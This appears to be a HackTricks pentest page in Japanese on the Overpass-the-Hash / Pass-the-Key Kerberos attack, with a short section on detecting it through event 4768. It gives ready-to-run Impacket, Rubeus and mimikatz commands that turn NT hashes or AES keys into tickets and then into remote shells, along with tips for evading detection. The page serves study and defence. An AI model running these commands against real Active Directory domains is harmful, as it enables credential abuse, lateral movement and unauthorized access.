# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** attack は、従来の NTLM protocol が制限され、Kerberos authentication が優先される環境向けに設計されています。この attack では、ユーザーの NTLM hash または AES keys を利用して Kerberos tickets を要求し、network 内のリソースへの不正 access を可能にします。

厳密には、以下の意味です。

- **Over-Pass-the-Hash** は通常、**NT hash** を **RC4-HMAC** Kerberos key 経由で Kerberos TGT に変換することを意味します。
- **Pass-the-Key** はより汎用的な version で、すでに **AES128/AES256** などの Kerberos key を持っており、それを使って TGT を直接要求します。

この違いは hardened environments では重要です。**RC4 が無効化されている**、または KDC が RC4 を想定しなくなっている場合、**NT hash だけでは不十分**であり、**AES key**（またはそこから AES key を導出するための cleartext password）が必要になります。

この attack を実行するには、まず対象ユーザーの account の NTLM hash または password を取得します。この情報を確保すると、その account の Ticket Granting Ticket (TGT) を取得でき、攻撃者はそのユーザーに permission がある services や machines に access できるようになります。

この process は、以下の commands で開始できます。<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256 が必要なシナリオでは、`-aesKey [AES key]` オプションを利用できます。<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` は `-service <SPN>` を使って **AS-REQ を通じて service ticket を直接要求する**こともサポートしており、追加の TGS-REQ なしで特定の SPN 用の ticket が必要な場合に便利です:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
さらに、取得したチケットは `smbexec.py` や `wmiexec.py` などのさまざまなツールで使用できるため、攻撃の範囲を広げられます。

_PyAsn1Error_ や _KDC cannot find the name_ などの問題は、通常、Impacket library を更新するか、IP address の代わりに hostname を使用することで解決でき、Kerberos KDC との互換性を確保できます。

Rubeus.exe を使用する別のコマンドシーケンスは、この technique の別の側面を示しています。<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
この方法は **Pass the Key** アプローチを踏襲し、ticket を直接 commandeering して authentication に利用することに重点を置いています。実際には:

- `Rubeus asktgt` は **raw Kerberos AS-REQ/AS-REP** 自体を送信するため、`/luid` で別の logon session を対象にしたり、`/createnetonly` で別の session を作成したりする場合を除き、admin rights は不要です。
- `mimikatz sekurlsa::pth` は credential material を logon session に patch するため、通常は local admin または `SYSTEM` が必要で、EDR の観点ではより noisy です。

Mimikatz の例:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
運用セキュリティに準拠し、AES256を使用するには、以下のコマンドを適用できます。
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` が関連するのは、Rubeus が生成するトラフィックがネイティブの Windows Kerberos とわずかに異なるためです。また、`/opsec` は **AES256** トラフィックを対象としている点にも注意してください。RC4 と併用する場合は通常 `/force` が必要になりますが、これでは目的の多くが失われます。なぜなら、現代のドメインでは **RC4 自体が強いシグナル**だからです。

## 検知に関する注意点

すべての TGT リクエストは、DC 上で **event `4768`** を生成します。現在の Windows ビルドでは、このイベントに、古い解説で言及されているものより有用なフィールドが含まれています。

- `TicketEncryptionType` は、発行された TGT に使用された enctype を示します。典型的な値は、**RC4-HMAC** が `0x17`、**AES128** が `0x11`、**AES256** が `0x12` です。<sup>[[3]](#references)</sup>
- 更新されたイベントでは、`SessionKeyEncryptionType`、`PreAuthEncryptionType`、およびクライアントが通知した enctypes も確認できるため、**実際の RC4 依存**と、紛らわしいレガシーのデフォルト設定を区別しやすくなっています。
- 現代的な環境で `0x17` が確認された場合、アカウント、ホスト、または KDC のフォールバック経路で RC4 が引き続き許可されている可能性を示す有力な手がかりです。そのため、NT-hash ベースの Over-Pass-the-Hash により適した環境であると言えます。

Microsoft は、2022 年 11 月の Kerberos hardening updates 以降、デフォルトで RC4 を使用する動作を段階的に縮小しています。現在公開されているガイダンスでは、**2026 年第 2 四半期末までに AD DC のデフォルトとして想定される enctype から RC4 を削除する**ことが推奨されています。攻撃者の視点では、これは **AES を使用した Pass-the-Key** がますます信頼性の高い手段になる一方、従来の **NT-hash-only OpTH** は hardening された環境でより頻繁に失敗するようになることを意味します。<sup>[[3]](#references)</sup>

Kerberos の encryption types と、関連する ticketing の動作について詳しくは、以下を参照してください。

{{#ref}}
kerberos-authentication.md
{{#endref}}

## よりステルス性の高いバージョン

> [!WARNING]
> 各 logon session で同時にアクティブにできる TGT は 1 つだけなので、注意してください。

1. Cobalt Strike の **`make_token`** を使用して、新しい logon session を作成します。
2. 次に、Rubeus を使用して、既存の logon session に影響を与えずに、新しい logon session 用の TGT を生成します。

Rubeus 自体から、使い捨ての **logon type 9** session を使用することでも、同様の分離を実現できます。
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
これは現在のセッションの TGT を上書きせず、通常はチケットを既存の logon session にインポートするより安全です。

## 参考資料

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Kerberos での RC4 使用の検出と修正](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
